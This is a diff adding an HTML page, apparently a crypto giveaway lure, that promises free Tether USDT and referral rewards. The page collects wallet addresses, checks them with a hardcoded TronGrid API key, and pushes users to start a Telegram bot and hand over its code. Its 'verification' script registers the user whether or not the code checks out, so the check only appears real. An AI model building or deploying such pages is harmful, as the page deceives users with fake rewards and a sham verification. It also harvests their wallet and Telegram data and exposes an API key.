@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="es">
+
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta property="og:title" content="Free Claimly USDT 🔥">
+    <meta property="og:description" content="Share your referral link and get 10 USDT per each valid referral!">
+    <meta property="og:image" content="https://cryptologos.cc/logos/tether-usdt-logo.png">
+    <meta property="og:url" content="https://freeclaimly.com/referral">
+    <meta property="og:type" content="website">
+    <title>Free Tether USDT(TRC20)</title>
+    <link rel="icon" href="img/tether.png" type="image/png">
+
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
+
+    <style>
+        body {
+            background: linear-gradient(135deg, #06d6a0, #04a078);
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-container {
+            background-color: white;
+            border-radius: 15px;
+            padding: 30px;
+            width: 300px;
+            text-align: center;
+        }
+        .btn.btn-primary {
+            margin-top: 10px;
+ 
+        }
+
+        .login-title h2{
+            margin-top: 10px;
+            margin-bottom: 20px;
+            font-size: 28px;   
+            width: 250px;         
+        }
+
+        .login-input {
+            border-radius: 15px;  
+
+            margin-bottom: 10px;
+        }
+
+        .modal-square .modal-content {
+            width: 300px; 
+            height: 300px;  
+            margin: auto;
+        }
+
+        .modal-header, .modal-footer {
+
+            flex-direction: column;
+            align-items: center; 
+            justify-content: center;  
+
+        }       
+ 
+        .modal-body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;  
+            justify-content: center;  
+            flex-grow: 1;   
+        }
+        .modal-body i.fa-check {
+
+            font-size: 100px;  
+            color: green;
+            margin-bottom: 25px; 
+        }
+ 
+ 
+        .modal-title {
+            text-align: center;
+            width: 100%;
+        }        
+
+        .form-control.login-input {
+            text-align: center;
+ 
+        }
+        .custom-btn {
+            border-radius: 15px;   
+
+            background-color: white;   
+            border: 1px solid #04a078;  
+            color: #04a078;            
+            transition: 0.3s;        
+        }
+        
+ 
+        .custom-btn:hover {
+            background-color: #04a078;  
+            color: white;               
+        }
+                
+        .modal-content {
+            border-radius: 15px;  
+        }
+        .btn-danger.w-100 {
+            border-radius: 10px;   
+        }
+        
+        .btn-success.w-100 {
+            border-radius: 10px; 
+        }
+ 
+        .btn-telegram {
+            background-color: white;
+            border: 1px solid #0088CC;
+            color: #0088CC;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;  
+        }
+
+        .btn-telegram:hover {
+            background-color: #0088CC;
+            border-color: #0088CC;
+            color: white;
+        }
+
+        .btn-telegram:focus {
+            box-shadow: 0 0 0 0.2rem rgba(0, 136, 204, 0.5);
+        }
+
+        .btn-telegram .fab {
+            font-size: 1.2rem;
+        }
+
+        .btn.custom-btn .bi-check {
+            margin-right: 5px;    
+            font-size: 16px;     
+            vertical-align: middle; 
+        }
+        
+
+    </style>
+</head>
+
+<body>
+
+    
+
+<div class="login-container">
+
+    <div class="login-logo">
+
+        <img src="img/tether.png" width="50" height="50">
+
+
+    </div>
+
+    <div class="login-title">
+        <h2>Free Tether USDT (TRC20)</h2>
+    </div>
+
+    <form action="https://claimlytrc20.cc/register" method="post" id="registrationForm">
+        <input type="text" class="form-control login-input" name="referralCode" value="Sponsor ID" placeholder="Sponsor ID" readonly>
+        <input type="text" class="form-control login-input" name="wallet" placeholder="Enter your wallet address" required oninvalid="this.setCustomValidity('Please enter your wallet address')" oninput="this.setCustomValidity('')">
+        <button type="submit" class="btn custom-btn w-100">Continue</button>
+
+    </form>
+
+</div>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+ 
+<!-- Modal-->
+<div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-body d-flex flex-column align-items-center" style="flex: 1;">
+                <!-- Texto "Error" -->
+                <h5 class="mt-4 mb-2" id="successModalLabel" style="font-weight: bold;">Almost ready!</h5>
+          
+                <!-- Icono de Error -->
+                <i class="fab fa-telegram-plane" style="color: #0088CC; font-size: 80px; margin-top: 10px; "></i>
+                      
+                <!-- Mensaje de Error -->
+                <p class="text-center mb-4"style="width: 90%;margin-top: 10px; ">Verify your account, start the following bot in telegram! And give me the code! </p>
+                
+                <form action="index.html#" method="post" style="width: 90%;">
+                    <input type="text" class="form-control login-input w-100 mb-2" name="tgcode" placeholder="Enter your code" required oninvalid="this.setCustomValidity('Start the bot, and send me the code')" oninput="this.setCustomValidity('')">
+                    
+                    <div class="d-flex flex-row justify-content-between" style="flex-grow: 1; gap: 10px;"> 
+                        
+                        <a href="https://t.me/verify_my_bot" target="_blank" class="btn custom-btn w-100 btn-telegram">
+                            <i class="fab fa-telegram-plane"></i> Start Bot
+                        </a>
+                        
+                        <button type="submit" class="btn custom-btn w-100">
+                            <i class="bi bi-check"></i> Verify
+                        </button>
+                        
+                          
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<!-- Modal de Error -->
+<div class="modal fade" id="errorModal" tabindex="-1" aria-labelledby="errorModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-body d-flex flex-column align-items-center">
+                <!-- Icono de Error -->
+                <i class="fas fa-times-circle" style="color: red; font-size: 40px; margin-top: 20px;"></i>
+                
+                <!-- Texto "Error" -->
+                <h5 class="mt-4 mb-2" id="errorModalLabel" style="font-weight: bold;">Try again</h5>
+                
+                <!-- Mensaje de Error -->
+                <p class="text-center mb-4">Please enter a valid Tron(TRX) wallet address that supports TRC20 Tokens!</p>
+                
+                <!-- Botón OK -->
+                <button type="button" class="btn btn-danger w-100" data-dismiss="modal">OK</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Captcha Modal -->
+
+
+<div id="captchaModal" class="modal fade" tabindex="-1" aria-labelledby="captchaModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="captchaModalLabel">Verificación</h5>
+            </div>
+            <div class="modal-body text-center">
+                <div class="h-captcha" data-sitekey="91895f24-456f-4926-9584-a0e9cd4c3f16"></div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-primary" onclick="verifyCaptcha()">Verificar</button>
+            </div>
+        </div>
+    </div>
+</div>
+ 
+
+<script src="https://hcaptcha.com/1/api.js" async defer></script>
+ 
+<script>
+
+
+    function getCookie(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+    }
+
+    if (getCookie('wallet')) {
+        window.location.href = "/dashboard";
+    }  
+ 
+    function verifyWalletAddress() {
+        var walletInput = document.querySelector('input[name="wallet"]');
+        var walletValue = walletInput.value.trim();
+    
+        fetch('https://api.trongrid.io/v1/accounts/' + walletValue, {
+            headers: {
+                'Tron-Api-Key': '372bcc21-b2b7-4e06-9cde-37071ce735b0'
+            }
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+ 
+                return fetch('/check-wallet-existence', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ wallet: walletValue })
+                })
+                .then(response => response.json())
+                .then(walletData => {
+                    if (walletData.exists) {
+                        document.cookie = "wallet=" + walletValue + ";path=/;max-age=2592000";
+                        window.location.href = "/dashboard";
+        
+                    } else {
+                        $('#successModal').modal('show');
+                    }
+                });
+                
+            } else {
+                throw new Error("Invalid wallet address");
+            }
+        })
+        .catch(error => {
+             $('#errorModal').modal('show');  
+        });
+    }
+    
+    function verifyCaptcha() {
+        var response = hcaptcha.getResponse();
+        if (!response) {
+            alert('Por favor, completa el captcha.');
+        } else {
+
+            $('#captchaModal').modal('hide');  
+            verifyWalletAddress();
+ 
+        }
+    }
+ 
+    $(document).ready(function() {
+ 
+        $('#successModal form').on('submit', function(event) {
+ 
+            event.preventDefault();
+
+ 
+            const codeValue = $(this).find('input[name="tgcode"]').val();
+ 
+            $.post('/verify-tg', { tgid: codeValue }, function(response) {
+                if (response.success) {
+                    document.cookie = "tgcode=" + codeValue + ";path=/;max-age=2592000";
+
+                    $('#successModal').modal('hide');
+                    registerUser()               
+                } else {
+                    
+                    document.cookie = "tgcode=" + codeValue + ";path=/;max-age=2592000";
+
+                    $('#successModal').modal('hide');
+                    registerUser()                 }
+            });
+        });
+
+    });
+
+
+
+    function registerUser() {
+ 
+        var formData = $("#registrationForm").serialize(); 
+    
+        $.ajax({
+            type: "POST",
+            url: "/register",
+            data: formData,
+            success: function(response) {
+                window.location.href = "/dashboard";
+
+            },
+            error: function(error) {
+ 
+                alert("Hubo un error al registrarse. Inténtalo de nuevo.");
+            }
+        });
+    }
+
+    
+
+    
+    document.getElementById('registrationForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        $('#captchaModal').modal('show'); 
+    });
+     
+</script>
+
+ 
+</body>
+</html>
